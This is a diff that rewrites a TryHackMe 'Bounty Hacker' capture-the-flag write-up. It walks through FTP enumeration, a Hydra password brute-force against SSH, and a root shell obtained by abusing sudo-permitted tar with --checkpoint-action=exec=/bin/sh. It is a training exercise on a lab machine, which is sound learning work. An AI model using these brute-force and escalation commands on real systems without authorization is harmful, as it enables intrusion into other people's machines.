@@ -1,83 +1,156 @@
-# Bounty Hacker — TryHackMe
+````markdown
+# TryHackMe — Bounty Hacker
 
 ## Overview
 
-Bounty Hacker was one of those rooms where the enumeration actually made sense once I started connecting the dots.
+Bounty Hacker is a Linux-based TryHackMe room focused on enumeration, gaining an initial foothold, and Linux privilege escalation.
 
-I solved this machine **on my own without using a walkthrough or hints**.
+I solved this room independently without using a walkthrough or hints.
 
-The goal was to get initial access and eventually escalate privileges to root.
+The main attack path was:
+
+`FTP Enumeration → Credential Discovery → SSH Access → Sudo Enumeration → Tar Abuse → Root`
 
 ---
 
 ## Enumeration
 
-I started with a basic Nmap scan to identify the services running on the target.
+I started with an Nmap scan to identify the services running on the target.
 
-The scan revealed FTP and SSH among the available services.
+```bash
+nmap -sC -sV TARGET_IP
+````
 
-I then looked into the FTP service. Although the directory listing was restricted, I was able to access and download files that were available through FTP.
+The scan revealed multiple services, including FTP and SSH.
 
-The files included:
-
-- `task.txt`
-- `locks.txt`
-
-After checking `task.txt`, I found the username:
-
-`lin`
-
-`locks.txt` contained a list of possible passwords.
+I decided to investigate FTP first.
 
 ---
 
-## Initial Access
+## FTP Enumeration
 
-Since SSH was available, I tried the discovered username with the password list.
+I connected to the FTP service:
 
-I used Hydra for the SSH login attempt:
+```bash
+ftp TARGET_IP
+```
+
+The FTP server did not give a straightforward directory listing, but I was still able to access files that were available on the server.
+
+Two interesting files were:
+
+```text
+locks.txt
+task.txt
+```
+
+I downloaded them for further investigation.
+
+After checking `task.txt`, I found a username:
+
+```text
+lin
+```
+
+The `locks.txt` file contained a list of possible passwords.
+
+At this point, I had:
+
+```text
+Username: lin
+Password list: locks.txt
+```
+
+---
+
+## Getting Initial Access
+
+Since SSH was running on the target, I tried using the discovered username and password list against SSH.
+
+I used Hydra:
 
 ```bash
 hydra -l lin -P locks.txt ssh://TARGET_IP
+```
+
 After finding valid credentials, I logged in through SSH:
 
-bash
+```bash
 ssh lin@TARGET_IP
-This gave me access to the machine as the user lin.
+```
 
-Privilege Escalation
-Once inside, the first thing I checked was the user's sudo permissions:
+I now had shell access as the user `lin`.
 
-bash
+---
+
+## Privilege Escalation
+
+After getting access, I checked what commands the current user could run with sudo:
+
+```bash
 sudo -l
-I found that /bin/tar could be executed with root privileges.
+```
 
-That immediately stood out because tar can be abused to execute commands through its checkpoint functionality.
+The interesting result was that `/bin/tar` could be executed with root privileges.
 
-I used:
+This immediately looked interesting because `tar` can be abused to execute commands through its checkpoint functionality.
 
-bash
+---
+
+## Exploiting Tar
+
+I used the following command:
+
+```bash
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-This dropped me into a root shell.
+```
 
-I verified the access with:
+This gave me a shell with root privileges.
 
-bash
+I verified the current user:
+
+```bash
 whoami
-which returned:
+```
 
-text
+Output:
+
+```text
 root
-With root access, I moved into /root and found the root flag.
+```
 
-bash
+So the privilege escalation was successful.
+
+---
+
+## Root Flag
+
+Once I had root access, I moved into the `/root` directory:
+
+```bash
 cd /root
 ls
-cat root.txt
-That confirmed the machine was fully compromised.
+```
 
-Attack Path
-text
+I found the root flag file:
+
+```text
+root.txt
+```
+
+I read it with:
+
+```bash
+cat root.txt
+```
+
+This confirmed that I had successfully completed the machine.
+
+---
+
+## Attack Path
+
+```text
 Nmap
   ↓
 FTP Enumeration
@@ -88,29 +161,35 @@ Username: lin
   ↓
 SSH Credential Discovery
   ↓
-SSH Access
+SSH Access as lin
   ↓
 sudo -l
   ↓
-/bin/tar as root
+/bin/tar allowed as root
   ↓
-Privilege Escalation
+Tar Checkpoint Abuse
   ↓
 Root Shell
-What I Learned
-FTP enumeration can reveal useful information even when the directory listing isn't straightforward.
+  ↓
+root.txt
+```
 
-Credential discovery can provide the initial foothold.
+## Key Takeaways
 
-sudo -l should always be checked after getting a shell.
+* Always enumerate all exposed services.
+* FTP can sometimes provide useful files even when access appears restricted.
+* Password lists and usernames found during enumeration can lead to the initial foothold.
+* After getting a shell, checking `sudo -l` should be one of the first things to do.
+* Misconfigured sudo permissions can turn a low-privileged account into root.
+* Understanding how common Linux binaries can be abused is an important part of privilege escalation.
 
-Misconfigured sudo permissions can lead directly to privilege escalation.
+## Conclusion
 
-Knowing how common Linux binaries can be abused is extremely useful during pentesting.
+Bounty Hacker was a good exercise in following the basic penetration testing methodology:
 
-Conclusion
-A really nice beginner-friendly machine for practicing the basic pentesting workflow:
+**Enumerate → Find a foothold → Enumerate again → Escalate → Root**
 
-Enumerate → Find a foothold → Enumerate again → Escalate → Root
+The best part for me was solving the complete attack path without using a walkthrough or hints.
 
-Most importantly, I solved this one without a walkthrough or hints, which made the root shell much more satisfying.
+```
+```
